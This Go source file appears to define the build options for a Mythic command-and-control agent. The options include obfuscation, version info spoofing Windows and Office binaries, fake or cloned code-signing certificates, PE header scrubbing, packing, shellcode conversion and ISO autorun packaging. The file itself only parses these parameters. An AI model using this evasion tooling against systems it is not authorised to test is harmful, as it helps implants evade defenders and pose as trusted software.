package agentfunctions

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// buildOpts is the parsed Mythic web UI build parameters. Every option that
// applies to an agent EXE build is exposed; shellcode-loader options
// (Exec/Evasion/AMSI/sandbox/injection/lolbin/triggers/...) cannot apply to
// a standalone agent and are intentionally absent.
type buildOpts struct {
	garble         bool
	garbleProfile  string
	console        bool
	arch           string
	compiler       string
	versioninfo    string
	spoofName      string
	versionConfig  string
	versionDonor   string
	obfuStrings    bool
	obfuDeadcode   bool
	obfuOpaque     bool
	obfuMBA        bool
	obfuControl    bool
	obfuWinAPI     bool
	goeditor       string
	strip          bool
	renameSections bool
	pack           string
	peStomp        bool
	sanitize       bool
	richDonor      string
	sign           string
	signDomain     string
	signCertPW     string
	signCert       string
	cloneCert      string
	retries        int
	taskingSize    int
	shellcode      bool
	packaging      string
	packagePW      string
	msiApp         string
	msiMfr         string
	msiScope       string
	isoAutorun     bool
}

func boolParam(bp *agentstructs.BuildParameters, name string) (bool, error) {
	return bp.GetBooleanArg(name)
}

func chooseParam(bp *agentstructs.BuildParameters, name string, allowed ...string) (string, error) {
	v, err := bp.GetChooseOneArg(name)
	if err != nil {
		return "", err
	}
	for _, a := range allowed {
		if v == a {
			return v, nil
		}
	}
	return "", fmt.Errorf("build parameter %q must be one of %s", name, strings.Join(allowed, ", "))
}

// fileParam returns the uploaded file UUID or "" when unset. File params are
// optional unless the selected mode requires them.
func fileParam(bp *agentstructs.BuildParameters, name string) string {
	v, err := bp.GetFileArg(name)
	if err != nil {
		return ""
	}
	return v
}

func stringParam(bp *agentstructs.BuildParameters, name string) string {
	v, err := bp.GetStringArg(name)
	if err != nil {
		return ""
	}
	return v
}

func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
	var o buildOpts
	var err error
	fail := func(e error) (buildOpts, error) { return buildOpts{}, e }
	if o.garble, err = boolParam(bp, "garble"); err != nil {
		return fail(err)
	}
	if o.garbleProfile, err = chooseParam(bp, "garble_profile", "random", "fixed", "aggressive"); err != nil {
		return fail(err)
	}
	if o.console, err = boolParam(bp, "console"); err != nil {
		return fail(err)
	}
	if o.arch, err = chooseParam(bp, "arch", "AMD_x64", "x86"); err != nil {
		return fail(err)
	}
	if o.compiler, err = chooseParam(bp, "compiler", "go", "native"); err != nil {
		return fail(err)
	}
	if o.compiler == "native" && o.arch == "x86" {
		return fail(fmt.Errorf("compiler=native supports AMD_x64 only"))
	}
	if o.versioninfo, err = chooseParam(bp, "versioninfo", "spoof", "random", "custom", "clone", "none"); err != nil {
		return fail(err)
	}
	if o.spoofName, err = bp.GetChooseOneCustomArg("spoof_name"); err != nil {
		return fail(err)
	}
	if o.spoofName == "" {
		o.spoofName = "cmd"
	}
	o.versionConfig = fileParam(bp, "versioninfo_config")
	o.versionDonor = fileParam(bp, "versioninfo_donor")
	if o.versioninfo == "custom" && o.versionConfig == "" {
		return fail(fmt.Errorf("versioninfo=custom needs versioninfo_config"))
	}
	if o.versioninfo == "clone" && o.versionDonor == "" {
		return fail(fmt.Errorf("versioninfo=clone needs versioninfo_donor"))
	}
	for _, p := range []struct {
		name string
		dest *bool
	}{
		{"obfu_strings", &o.obfuStrings},
		{"obfu_deadcode", &o.obfuDeadcode},
		{"obfu_opaque", &o.obfuOpaque},
		{"obfu_mba", &o.obfuMBA},
		{"obfu_controlflow", &o.obfuControl},
		{"obfu_winapi", &o.obfuWinAPI},
		{"strip", &o.strip},
		{"rename_sections", &o.renameSections},
		{"pe_stomp", &o.peStomp},
		{"sanitize", &o.sanitize},
		{"iso_autorun", &o.isoAutorun},
	} {
		if *p.dest, err = boolParam(bp, p.name); err != nil {
			return fail(err)
		}
	}
	if o.goeditor, err = chooseParam(bp, "goeditor", "basic", "extended"); err != nil {
		return fail(err)
	}
	if o.pack, err = chooseParam(bp, "pack", "none", "upx"); err != nil {
		return fail(err)
	}
	o.richDonor = fileParam(bp, "richheader_donor")
	if o.sign, err = chooseParam(bp, "sign", "none", "self", "valid"); err != nil {
		return fail(err)
	}
	o.signDomain = stringParam(bp, "sign_domain")
	o.signCertPW = stringParam(bp, "sign_cert_pw")
	o.signCert = fileParam(bp, "sign_cert")
	o.cloneCert = fileParam(bp, "clone_cert")
	if o.sign == "self" && o.signDomain == "" {
		return fail(fmt.Errorf("sign=self needs sign_domain"))
	}
	if o.sign == "valid" && o.signCert == "" {
		return fail(fmt.Errorf("sign=valid needs sign_cert"))
	}
	retries, err := bp.GetNumberArg("retries")
	if err != nil {
		return fail(err)
	}
	o.retries = int(retries)
	if o.retries < 1 {
		return fail(fmt.Errorf("retries must be >= 1"))
	}
	tasking, err := bp.GetNumberArg("tasking_size")
	if err != nil {
		return fail(err)
	}
	o.taskingSize = int(tasking)
	if o.shellcode, err = boolParam(bp, "shellcode"); err != nil {
		return fail(err)
	}
	if o.packaging, err = chooseParam(bp, "package", "none", "zip", "iso", "img", "vhd", "7z", "msi"); err != nil {
		return fail(err)
	}
	if o.shellcode && o.packaging != "none" {
		return fail(fmt.Errorf("shellcode output needs package=none"))
	}
	if o.shellcode && o.sign != "none" {
		return fail(fmt.Errorf("shellcode output cannot be signed (use sign=none)"))
	}
	o.packagePW = stringParam(bp, "package_password")
	o.msiApp = stringParam(bp, "msi_app_name")
	o.msiMfr = stringParam(bp, "msi_manufacturer")
	o.msiScope = stringParam(bp, "msi_scope")
	if o.isoAutorun && o.packaging != "iso" {
		return fail(fmt.Errorf("iso_autorun needs package=iso"))
	}
	return o, nil
}

// fetchFile downloads an uploaded File param into dir, returning its path.
func fetchFile(fileID, dir, name string) (string, error) {
	resp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{AgentFileID: fileID})
	if err != nil {
		return "", err
	}
	if resp == nil || !resp.Success {
		msg := "unknown error"
		if resp != nil {
			msg = resp.Error
		}
		return "", fmt.Errorf("fetching uploaded file: %s", msg)
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, resp.Content, 0o644); err != nil {
		return "", err
	}
	return path, nil
}

func buildParameters() []agentstructs.BuildParameter {
	boolean := func(name, desc string, def bool) agentstructs.BuildParameter {
		return agentstructs.BuildParameter{Name: name, Description: desc, Required: false,
			DefaultValue: def, ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN}
	}
	choose := func(name, desc string, choices []string, def string) agentstructs.BuildParameter {
		return agentstructs.BuildParameter{Name: name, Description: desc, Required: false,
			DefaultValue: def, ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE, Choices: choices}
	}
	str := func(name, desc string) agentstructs.BuildParameter {
		return agentstructs.BuildParameter{Name: name, Description: desc, Required: false,
			DefaultValue: "", ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING}
	}
	file := func(name, desc string) agentstructs.BuildParameter {
		return agentstructs.BuildParameter{Name: name, Description: desc, Required: false,
			DefaultValue: "", ParameterType: agentstructs.BUILD_PARAMETER_TYPE_FILE}
	}
	number := func(name, desc string, def float64) agentstructs.BuildParameter {
		return agentstructs.BuildParameter{Name: name, Description: desc, Required: false,
			DefaultValue: def, ParameterType: agentstructs.BUILD_PARAMETER_TYPE_NUMBER}
	}
	return []agentstructs.BuildParameter{
		boolean("garble", "Obfuscate with garble (-tiny -literals). Slows the build.", false),
		choose("garble_profile", "Garble controlflow directive profile.", []string{"random", "fixed", "aggressive"}, "random"),
		boolean("console", "Keep the console window (disables hidden-window build).", false),
		choose("arch", "Target architecture.", []string{"AMD_x64", "x86"}, "AMD_x64"),
		choose("compiler", "Compiler toolchain: go (default) or native (64KB C agent via zig cc, no Go runtime).", []string{"go", "native"}, "go"),
		choose("versioninfo", "Version resource mode: spoof (built-in), random, custom (JSON), clone (donor PE), none.", []string{"spoof", "random", "custom", "clone", "none"}, "spoof"),
		{
			Name: "spoof_name", Description: "Windows binary to mimic when versioninfo=spoof.",
			Required: false, DefaultValue: "cmd", ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE_CUSTOM,
			Choices: []string{"APMon", "bisrv", "btpanui", "certcli", "cmdext", "httpapi", "logoncli", "netlogon", "tcpmon", "OneNote", "Excel", "Word", "Powerpnt", "Outlook", "lync", "cmd", "OneDrive", "apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dnsapi", "dpapi", "sechost", "schannel", "urlmon", "win32u", "appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "Game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec", "Timesheet", "Reports", "Zoom", "Updates", "Calendar", "Memo", "Desk", "Appwiz"},
		},
		file("versioninfo_config", "Versioninfo JSON (requires versioninfo=custom)."),
		file("versioninfo_donor", "Donor PE for versioninfo=clone."),
		boolean("obfu_strings", "Encrypt string literals in agent source.", false),
		boolean("obfu_deadcode", "Insert dead code paths.", false),
		boolean("obfu_opaque", "Insert opaque predicates.", false),
		boolean("obfu_mba", "Mixed boolean-arithmetic expression rewrite.", false),
		boolean("obfu_controlflow", "Source control-flow flattening.", false),
		boolean("obfu_winapi", "Hide static API/DLL names.", false),
		choose("goeditor", "Go string scrubbing: basic (10 patterns) or extended (50+).", []string{"basic", "extended"}, "basic"),
		boolean("strip", "Run strip -s before signing.", false),
		boolean("rename_sections", "Rename Go section names to MSVC-neutral ones.", false),
		choose("pack", "Compress before signing.", []string{"none", "upx"}, "none"),
		boolean("pe_stomp", "Deep PE post-processing: zero Rich header, randomize timestamp, spoof linker version, zero debug dir.", false),
		boolean("sanitize", "SanitizePE before signing (zeros Rich/timestamp/linker/debug).", false),
		file("richheader_donor", "Donor PE whose Rich header is cloned (optional)."),
		choose("sign", "Authenticode signing: none, self (fake cert from domain), valid (uploaded PFX).", []string{"none", "self", "valid"}, "none"),
		str("sign_domain", "Domain for the fake signing cert (sign=self, e.g. www.acme.com)."),
		str("sign_cert_pw", "Password for the uploaded PFX (sign=valid)."),
		file("sign_cert", "PFX code-signing cert (sign=valid)."),
		file("clone_cert", "Donor PE whose certificate is cloned (optional, runs before signing)."),
		number("retries", "Checkin attempts with doubling backoff.", 3),
		number("tasking_size", "Tasks per poll (-1 = all).", -1),
		boolean("shellcode", "Convert the EXE to raw shellcode (.bin) with Donut. Needs package=none and sign=none; the .bin feeds service_wrapper and external loaders.", false),
		choose("package", "Wrap the EXE into a container.", []string{"none", "zip", "iso", "img", "vhd", "7z", "msi"}, "none"),
		str("package_password", "Password for 7z packaging (optional)."),
		str("msi_app_name", "MSI product name (optional)."),
		str("msi_manufacturer", "MSI manufacturer (optional)."),
		str("msi_scope", "MSI scope user/machine (optional)."),
		boolean("iso_autorun", "Add autorun.inf to ISO packages.", false),
	}
}
